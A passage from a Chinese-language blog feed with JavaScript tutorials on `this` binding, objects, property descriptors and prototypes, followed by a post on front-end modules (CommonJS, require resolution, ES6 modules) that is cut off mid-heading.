// 这里的 `this` 是词法上从 `foo()` 采用的</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj1 = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var obj2 = &#123;</span><br><span class="line">a: 3</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var bar = foo.call( obj1 );</span><br><span class="line">bar.call( obj2 ); // 2, 不是3!</span><br></pre></td></tr></table></figure><blockquote><p>它们本质是使用广为人知的词法作用域来禁止了传统的 <code>this</code> 机制</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">var self = this; // 词法上捕获 `this`</span><br><span class="line">setTimeout( function()&#123;</span><br><span class="line">console.log( self.a );</span><br><span class="line">&#125;, 100 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.call( obj ); // 2</span><br></pre></td></tr></table></figure><h2 id="二、对象"><a href="#二、对象" class="headerlink" title="二、对象"></a>二、对象</h2><p>前面我们讲解了 this 绑定如何根据函数调用的调用点指向不同的对象。但究竟什么是对象，为什么我们需要指向它们？</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p class="tip">对象来自于两种形式：声明（字面）形式，和构造形式。</p><blockquote><p>一个对象的字面语法看起来像这样：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var myObj = &#123;</span><br><span class="line">key: value</span><br><span class="line">// ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>构造形式看起来像这样：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var myObj = new Object();</span><br><span class="line">myObj.key = value;</span><br></pre></td></tr></table></figure><p>构造形式和字面形式的结果是完全同种类的对象。唯一真正的区别在于你可以向字面声明一次性添加一个或多个键/值对，而对于构造形式，你必须一个一个地添加属性。</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><blockquote><p>JS 的六种主要类型</p></blockquote><ul><li>string</li><li>number</li><li>boolean</li><li>null</li><li>undefined</li><li>object</li></ul><blockquote><p>内建对象</p></blockquote><ul><li>String</li><li>Number</li><li>Boolean</li><li>Object</li><li>Function</li><li>Array</li><li>Date</li><li>RegExp</li><li>Error</li></ul><h3 id="基本字面量"><a href="#基本字面量" class="headerlink" title="基本字面量"></a>基本字面量</h3><p>在JavaScript中基本字面量会转换成对象</p><p class="tip">一般来说，我们通过基本字面量：<code>let str = &#39;hello world&#39;;</code>创建的字符串，他只是个基本类型按道理来说不存在属性，但通过<code>str.length</code>却可以轻松渠道str字符串的长度，这是怎么回事呢，原来JavaScript会将<strong>字面量形式的str</strong>，转变成<code>String</code>对象形式的字符串</p><blockquote><p>基本字面量转变成对象的类型</p></blockquote><ul><li>String</li><li>Number</li><li>Boolean</li><li>RegExp</li></ul><blockquote><p>深浅拷贝</p></blockquote><p>在进行深浅拷贝前，我们先明确，基本数据类型和复杂类型赋值的不同：</p><ul><li>在我们进行赋值操作的时候，基本数据类型的赋值（=）是在内存中新开辟一段栈内存，然后再把再将值赋值到新的栈中</li><li>但是引用类型的赋值是传址。只是改变指针的指向，例如，也就是说引用类型的赋值是对象保存在栈中的地址的赋值，这样的话两个变量就指向同一个对象，因此两者之间操作互相有影响</li></ul><blockquote><p>赋值（=）和浅拷贝的区别</p></blockquote><p>浅复制只会将对象的各个属性进行依次复制，并不会进行递归复制，而 JavaScript 存储对象都是存地址的，所以浅复制会导致赋值后的对象属性指向同一个内存地址</p><h3 id="属性描述符"><a href="#属性描述符" class="headerlink" title="属性描述符"></a>属性描述符</h3><blockquote><p>获取对象属性性质</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.getOwnPropertyDescriptor( myObject, &quot;a&quot; );</span><br><span class="line">// &#123;</span><br><span class="line">//    value: 2,</span><br><span class="line">//    writable: true,</span><br><span class="line">//    enumerable: true,</span><br><span class="line">//    configurable: true</span><br><span class="line">// &#125;</span><br></pre></td></tr></table></figure><blockquote><p>明确定义一个属性</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">Object.defineProperty( myObject, &quot;a&quot;, &#123;</span><br><span class="line">value: 2,</span><br><span class="line">writable: true,</span><br><span class="line">configurable: true,</span><br><span class="line">enumerable: true</span><br><span class="line">&#125; );</span><br><span class="line"></span><br><span class="line">myObject.a; // 2</span><br></pre></td></tr></table></figure><p class="tip">使用 defineProperty(..)，我们手动、明确地在 myObject 上添加了一个直白的，普通的 a 属性。然而，你通常不会使用这种手动方法，除非你想要把描述符的某个性质修改为不同的值。</p><blockquote><p>修改属性性质</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">    a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.defineProperty( myObject, &quot;a&quot;, &#123;</span><br><span class="line">value: 2, </span><br><span class="line">writable: true,</span><br><span class="line">configurable: true,</span><br><span class="line">enumerable: true </span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure><ul><li>value<ul><li>默认值：设置的初始值</li></ul></li><li>writable<ul><li>可修改性</li><li>默认值：true</li><li>将属性设置true后，修改属性值，将会发生<code>TypeError</code>(如果你试图改变一个不可配置属性的描述符定义，就会发生 TypeError)</li></ul></li><li>configurable<ul><li>可配置性</li><li>能否通过defineProperty重新定义特性</li><li>设置false后无法，更改特性</li><li>默认值：true</li><li>阻止的另外一个事情是使用 delete 操作符移除既存属性的能力</li></ul></li><li>enumerable<ul><li>可遍历性</li><li>默认值：true</li></ul></li></ul><h3 id="设置对象的几个方法"><a href="#设置对象的几个方法" class="headerlink" title="设置对象的几个方法"></a>设置对象的几个方法</h3><h4 id="防止扩展-Prevent-Extensions"><a href="#防止扩展-Prevent-Extensions" class="headerlink" title="防止扩展(Prevent Extensions)"></a>防止扩展(Prevent Extensions)</h4><p><code>Object.preventExtensions(..)</code></p><p class="tip">不能添加新的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.preventExtensions( myObject );</span><br><span class="line"></span><br><span class="line">myObject.b = 3;</span><br><span class="line">myObject.b; // undefined</span><br></pre></td></tr></table></figure><h4 id="封印（Seal）"><a href="#封印（Seal）" class="headerlink" title="封印（Seal）"></a>封印（Seal）</h4><p><code>Object.Seal(..)</code></p><p class="tip">它实质上在当前的对象上调用 Object.preventExtensions(..)、并且属性标记为 configurable:false</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.Seal( myObject );</span><br></pre></td></tr></table></figure><h4 id="冻结（Freeze）"><a href="#冻结（Freeze）" class="headerlink" title="冻结（Freeze）"></a>冻结（Freeze）</h4><p><code>Object.freeze(..)</code></p><p class="tip">Object.freeze(..) 创建一个冻结的对象，这意味着它实质上在当前的对象上调用 Object.seal(..)，同时也将它所有的“数据访问”属性设置为 writable:false，所以它们的值不可改变。</p><h3 id="混合（淆）“类”的对象"><a href="#混合（淆）“类”的对象" class="headerlink" title="混合（淆）“类”的对象"></a>混合（淆）“类”的对象</h3><p>在JavaScript中是否存在一般语言类似于Java、C++类的概念，而JavaScript中的原型又是什么东西呢</p><p class="tip">在JavaScript中类并不是我们想象中的类，JavaScript还是基于原型的概念进行设计，尽管它看起来存在：<code>new</code>、<code>instanceof</code>这些让你以为它是类的东西</p><p>在开始了解前，我们先明白什么是类？</p><p>类是一种事物的抽象，拿建汽车来说，汽车需要：</p><ul><li>轮胎</li><li>发动机</li><li>后视镜等等…</li></ul><p>我们通过对汽车事物进行抽象，通过实例化产生新的汽车</p><p>并且类还包含继承、多态等概念：同样允许父类的泛化行为被子类覆盖，从而使它更加具体。实际上，相对多态允许我们在覆盖行为中引用基础行为</p><p>类的实例化上就是一个拷贝的过程，如下图：</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190408_13k6cb57lifabic37gi0889i67250_253x333.png" alt=""></p><blockquote><p>JavaScript中的”类”</p></blockquote><p class="tip">当你“继承”或是“实例化”时，JavaScript 的对象机制不会 自动地 执行拷贝行为。很简单，在 JavaScript 中没有“类”可以拿来实例化，只有对象。而且对象也不会被拷贝到另一个对象中，而是被 链接在一起</p><p>在其他语言中观察到的类的行为意味着拷贝，让我们来看看 JS 开发者如何在 JavaScript 中 模拟 这种 缺失 的类的拷贝行为：mixins（混合）。我们会看到两种“mixin”：明确的（explicit） 和 隐含的（implicit）</p><h2 id="三、原型（Prototype）"><a href="#三、原型（Prototype）" class="headerlink" title="三、原型（Prototype）"></a>三、原型（Prototype）</h2><h3 id="Object-prototype"><a href="#Object-prototype" class="headerlink" title="Object.prototype"></a>Object.prototype</h3><p>每个 普通 的 [[Prototype]] 链的最顶端，是内建的 Object.prototype。这个对象包含各种在整个 JS 中被使用的共通工具，因为 JavaScript 中所有普通（内建，而非被宿主环境扩展的）的对象都“衍生自”（也就是，使它们的 [[Prototype]] 顶端为）Object.prototype 对象。</p><p>你会在这里发现一些你可能很熟悉的工具，比如 .toString() 和 .valueOf()</p><h3 id="设置与遮蔽属性"><a href="#设置与遮蔽属性" class="headerlink" title="设置与遮蔽属性"></a>设置与遮蔽属性</h3><p>如果给一个对象添加属性，而这个属性或方法已经在其<code>[[Prototype]]</code>上已存在，这时是否会展现出”多态”特性，子属性</p><p>让我们来看下面的实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myObject.foo = &quot;bar&quot;;</span><br></pre></td></tr></table></figure><p>正如我们被暗示的那样，在 myObject 上的 foo 遮蔽没有看起来那么简单。我们现在来考察 myObject.foo = “bar” 赋值的三种场景，当 foo 不直接存在 于 myObject，但 存在 于 myObject 的 [[Prototype]] 链的更高层时：</p><ul><li>如果一个普通的名为 foo 的数据访问属性在 [[Prototype]] 链的高层某处被找到，而且没有被标记为只读（writable:false），那么一个名为 foo 的新属性就直接添加到 myObject 上，形成一个 遮蔽属性。</li><li>如果一个 foo 在 [[Prototype]] 链的高层某处被找到，但是它被标记为 只读（writable:false） ，那么设置既存属性和在 myObject 上创建遮蔽属性都是 不允许 的。如果代码运行在 strict mode 下，一个错误会被抛出。否则，这个设置属性值的操作会被无声地忽略。不论怎样，没有发生遮蔽。</li><li>如果一个 foo 在 [[Prototype]] 链的高层某处被找到。没有 foo 会被添加到（也就是遮蔽在）myObject 上。<strong>必须使用 Object.defineProperty(..)</strong></li></ul><h3 id="“类”"><a href="#“类”" class="headerlink" title="“类”"></a>“类”</h3><p>现在你可能会想知道：“为什么 一个对象需要链到另一个对象？” 真正的好处是什么？这是一个很恰当的问题，但在我们能够完全理解和体味它是什么和如何有用之前，我们必须首先理解 [[Prototype]] 不是 什么。</p><p>在 JavaScript 中，对于对象来说没有抽象模式/蓝图，即没有面向类的语言中那样的称为类的东西。JavaScript 只有 对象。</p><p>实际上，在所有语言中，JavaScript 几乎是独一无二的，也许是唯一的可以被称为“面向对象”的语言，因为可以根本没有类而直接创建对象的语言很少，而 JavaScript 就是其中之一。</p><p>在 JavaScript 中，类不能（因为根本不存在）描述对象可以做什么。对象直接定义它自己的行为。这里 仅有 对象。</p><h3 id="“类”函数"><a href="#“类”函数" class="headerlink" title="“类”函数"></a>“类”函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">// ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = new Foo();</span><br><span class="line"></span><br><span class="line">Object.getPrototypeOf( a ) === Foo.prototype; // true</span><br></pre></td></tr></table></figure><p>在面向类的语言中，可以制造一个类的多个 拷贝（即“实例”），就像从模具中冲压出某些东西一样。我们在第四章中看到，这是因为初始化（或者继承）类的处理意味着，“将行为计划从这个类拷贝到物理对象中”，对于每个新实例这都会发生。</p><p>但是在 JavaScript 中，没有这样的拷贝处理发生。你不会创建类的多个实例。你可以创建多个对象，它们的 [[Prototype]] 连接至一个共通对象。但默认地，没有拷贝发生，如此这些对象彼此间最终不会完全分离和切断关系，而是 链接在一起。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>当试图在一个对象上进行属性访问，而对象又没有该属性时，对象内部的 [[Prototype]] 链接定义了 [[Get]] 操作（见第三章）下一步应当到哪里寻找它。这种对象到对象的串行链接定义了对象的“原形链”（和嵌套的作用域链有些相似），在解析属性时发挥作用。</p><p>所有普通的对象用内建的 Object.prototype 作为原形链的顶端（就像作用域查询的顶端是全局作用域），如果属性没能在链条的前面任何地方找到，属性解析就会在这里停止。toString()，valueOf()，和其他几种共同工具都存在于这个 Object.prototype 对象上，这解释了语言中所有的对象是如何能够访问他们的。</p><p>在 JavaScript 中的关键区别是，没有拷贝发生。取而代之的是对象最终通过 [[Prototype]] 链链接在一起。</p><p class="tip">当一个属性/方法引用在一个对象上发生，而这样的属性/方法又不存在时，这个链接就会被使用。在这种情况下，[[Prototype]] 链接告诉引擎去那个被链接的对象上寻找该属性/方法。接下来，如果那个对象也不能满足查询，就沿着它的 [[Prototype]] 查询，如此继续。这种对象间的一系列链接构成了所谓的“原形链”。<br></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、this关键词&quot;&gt;&lt;a href=&quot;#一、this关键词&quot; class=&quot;headerlink&quot; title=&quot;一、this关键词&quot;&gt;&lt;/a&gt;一、this关键词&lt;/h2&gt;&lt;p class=&quot;tip&quot;&gt;this是关键词，表示指向的索引位置&lt;/p&gt;

&lt;p&gt;很多人对于this最终指向常见的误解是，this是编写时绑定的，通常会将其认为成一下几种情况：&lt;/p&gt;
&lt;p&gt;1、认为this指向，foo函数&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;foo&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;foo();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>前端模块化</title>
    <link href="http://zhoushaw.github.io/2019/03/27/learning/font-end/js/module/"/>
    <id>http://zhoushaw.github.io/2019/03/27/learning/font-end/js/module/</id>
    <published>2019-03-27T03:43:35.000Z</published>
    <updated>2019-04-23T15:16:05.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学习新一个东西前，最好的办法是了解它能给我们带来什么好处我们为什么学习它，从而激发学习兴趣，哈哈哈~又扯了一堆，下面进入我们前端模块化探索之旅吧。</p><blockquote><p>模块化的历史</p></blockquote><p>在正式进入模块化学习前我们来了解一下前端模块化的前生今世。</p><div><a id="more"></a></div><p>这里我就不过多赘述了，可以参考玉伯大佬的<a href="https://github.com/seajs/seajs/issues/547" target="_blank" rel="noopener">前端模块化开发的价值</a></p><blockquote><p>模块化规范</p></blockquote><p>现有模块化标准：</p><ul><li>CommonJS</li><li>AMD</li><li>CMD</li><li>ES6</li></ul><h2 id="浏览器加载脚本"><a href="#浏览器加载脚本" class="headerlink" title="浏览器加载脚本"></a>浏览器加载脚本</h2><blockquote><p>传统方法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 页面内嵌的脚本 --&gt;</span><br><span class="line">&lt;script type=&quot;application/javascript&quot;&gt;</span><br><span class="line">  // module code</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 外部脚本 --&gt;</span><br><span class="line">&lt;script type=&quot;application/javascript&quot; src=&quot;path/to/myModule.js&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>默认情况下，浏览器是同步加载 JavaScript 脚本，即渲染引擎遇到<code>&lt;script&gt;</code>标签就会停下来，等到执行完脚本，再继续向下渲染。如果是外部脚本，还必须加入脚本下载的时间。</p><p>如果脚本体积很大，下载和执行的时间就会很长，因此造成浏览器堵塞，用户会感觉到浏览器“卡死”了，没有任何响应。这显然是很不好的体验，所以浏览器允许脚本异步加载，下面就是两种异步加载的语法。</p><ul><li>defer是“渲染完再执行”</li><li>async是“下载完就执行”</li></ul><h2 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h2><p><strong>Node.js是commonJS规范的主要实践者</strong>，它有四个重要的环境变量为模块化的实现提供支持：<strong>module</strong>、<strong>exports</strong>、<strong>require</strong>、<strong>global</strong>。实际使用时，用<strong>module.exports</strong>定义当前模块对外输出的接口（不推荐直接用<strong>exports</strong>），用<strong>require</strong>加载模块。</p><p>每个文件就是一个模块，有自己的作用域。在一个文件里面定义的变量、函数、类，都是私有的，对其他文件不可见。</p><h3 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// example.js</span><br><span class="line">var x = 5;</span><br><span class="line">var addX = function (value) &#123;</span><br><span class="line">  return value + x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>上面代码中，变量x和函数addX，是当前文件example.js私有的，其他文件不可见。</strong></p><h3 id="global对象"><a href="#global对象" class="headerlink" title="global对象"></a>global对象</h3><p>如果想在多个文件分享变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global.__ENV__ = dev;</span><br></pre></td></tr></table></figure><p>上面代码的<strong>ENV</strong>变量，可以被所有文件读取。当然，需要尽量避免定义全局属性</p><h3 id="导出模块"><a href="#导出模块" class="headerlink" title="导出模块"></a>导出模块</h3><p>CommonJS规范规定，每个模块内部，<strong>module</strong>变量代表当前模块。这个变量是一个对象，它的<strong>exports</strong>属性（即<strong>module.exports</strong>）是对外的接口。加载某个模块，其实是加载该模块的<strong>module.exports</strong>属性。</p><p>为了方便，Node为每个模块提供一个exports变量，指向module.exports。这等同在每个模块头部，有一行这样的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var exports = module.exports;</span><br></pre></td></tr></table></figure><p>在对外输出模块接口时，可以向<strong>exports</strong>对象添加方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exports.area = function (r) &#123;</span><br><span class="line">  return Math.PI * r * r;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">exports.circumference = function (r) &#123;</span><br><span class="line">  return 2 * Math.PI * r;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>注意，不能直接将exports变量指向一个值，因为这样等于切断了exports与module.exports的联系。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exports = function(x) &#123;console.log(x)&#125;;</span><br></pre></td></tr></table></figure><p>这意味着，如果一个模块的对外接口，就是一个单一的值，不能使用exports输出，只能使用module.exports输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exports.hello = function() &#123;</span><br><span class="line">  return &apos;hello&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">module.exports = &apos;Hello world&apos;;</span><br></pre></td></tr></table></figure><p>下面代码中，hello函数是无法对外输出的，因为module.exports被重新赋值了</p><h3 id="引入模块"><a href="#引入模块" class="headerlink" title="引入模块"></a>引入模块</h3><p>Node使用CommonJS模块规范，内置的<strong>require</strong>命令用于加载模块文件。</p><p>require命令的基本功能是，<strong>读入并执行一个JavaScript文件</strong>，然后返回<strong>该模块的exports对象</strong>。如果没有发现指定模块，会报错。</p><blockquote><p>特性</p></blockquote><p>commonJS用同步的方式加载模块。在服务端，模块文件都存在本地磁盘，读取非常快，所以这样做不会有问题。但是在浏览器端，限于网络原因，更合理的方案是使用异步加载。</p><blockquote><p>导入模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// math.js</span><br><span class="line">var basicNum = 0;</span><br><span class="line">function add(a, b) &#123;</span><br><span class="line">  return a + b;</span><br><span class="line">&#125;</span><br><span class="line">module.exports = &#123; //在这里写上需要向外暴露的函数、变量</span><br><span class="line">  add: add,</span><br><span class="line">  basicNum: basicNum</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// index.js</span><br><span class="line">var math = require(&apos;./math&apos;);</span><br><span class="line">//&#123;</span><br><span class="line">//    add: [Function],</span><br><span class="line">//    basicNum: 0</span><br><span class="line">//&#125;</span><br></pre></td></tr></table></figure><blockquote><p>加载规则</p></blockquote><ol><li><p>如果参数字符串以“/”开头，则表示加载的是一个位于绝对路径的模块文件。比如，require(‘/home/marco/foo.js’)将加载/home/marco/foo.js。</p></li><li><p>如果参数字符串以“./”开头，则表示加载的是一个位于相对路径（跟当前执行脚本的位置相比）的模块文件。比如，require(‘./circle’)将加载当前脚本同一目录的circle.js。</p></li><li><p>如果参数字符串不以“./“或”/“开头，而且是一个路径，比如require(‘example-module/path/to/file’)，则将先找到example-module的位置，然后再以它为参数，找到后续路径。</p></li><li><p>如果指定的模块文件没有发现，Node会尝试为文件名添加.js、.json、.node后，再去搜索。.js件会以文本格式的JavaScript脚本文件解析，.json文件会以JSON格式的文本文件解析，.node文件会以编译后的二进制文件解析。</p></li><li><p>如果想得到require命令加载的确切文件名，使用require.resolve()方法。</p></li><li><p>如果参数字符串不以“./“或”/“开头，则表示加载的是一个默认提供的核心模块（位于Node的系统安装目录中），或者一个位于各级node_modules目录的已安装模块（全局安装或局部安装）。</p></li></ol><p>举例来说，脚本/home/user/projects/foo.js执行了require(‘bar.js’)命令，Node会依次搜索以下文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/node/bar.js</span><br><span class="line">/home/user/projects/node_modules/bar.js</span><br><span class="line">/home/user/node_modules/bar.js</span><br><span class="line">/home/node_modules/bar.js</span><br><span class="line">/node_modules/bar.js</span><br></pre></td></tr></table></figure><blockquote><p>引入</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 引用自定义的模块时，参数包含路径，可省略.js</span><br><span class="line">var math = require(&apos;./math&apos;);</span><br><span class="line">math.add(2, 5);</span><br><span class="line"></span><br><span class="line">// 引用核心模块时，不需要带路径</span><br><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line">http.createService(...).listen(3000);</span><br></pre></td></tr></table></figure><blockquote><p>目录的加载规则</p></blockquote><p>在目录中放置一个package.json文件，并且将入口文件写入main字段。下面是一个例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// package.json</span><br><span class="line">&#123; &quot;name&quot; : &quot;some-library&quot;,</span><br><span class="line">  &quot;main&quot; : &quot;./lib/some-library.js&quot; &#125;</span><br></pre></td></tr></table></figure><h3 id="module对象"><a href="#module对象" class="headerlink" title="module对象"></a>module对象</h3><p>Node内部提供一个Module构建函数。所有模块都是Module的实例。</p><ul><li>module.id 模块的识别符，通常是带有绝对路径的模块文件名。</li><li>module.filename 模块的文件名，带有绝对路径。</li><li>module.loaded 返回一个布尔值，表示模块是否已经完成加载。</li><li>module.parent 返回一个对象，表示调用该模块的模块。</li><li>module.children 返回一个数组，表示该模块要用到的其他模块。</li><li>module.exports 表示模块对外输出的值。</li></ul><h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><p>模块功能主要由两个命令构成：<strong>export</strong>和<strong>import</strong>。<strong>export</strong>命令用于规定模块的对外接口，<strong>import</strong>命令用于输入其他模块提供的功能。</p><p>一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。如果你希望外部能够读取模块内部的某个变量，就必须使用export关键字输出该变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;module&quot;&gt;</span><br><span class="line">  import utils from &quot;./utils.js&quot;;</span><br><span class="line"></span><br><span class="line">  // other code</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="ES6-模块与-CommonJS-模块的差异"><a href="#ES6-模块与-CommonJS-模块的差异" class="headerlink" title="ES6 模块与 CommonJS 模块的差异"></a>ES6 模块与 CommonJS 模块的差异</h3><blockquote><p>它们有两个重大差异</p></blockquote><ul><li>CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。</li><li>CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。</li></ul><h4 id="ES6-模块加载-CommonJS-模块"><a href="#ES6-模块加载-CommonJS-模块" class="headerlink" title="ES6 模块加载 CommonJS 模块"></a>ES6 模块加载 CommonJS 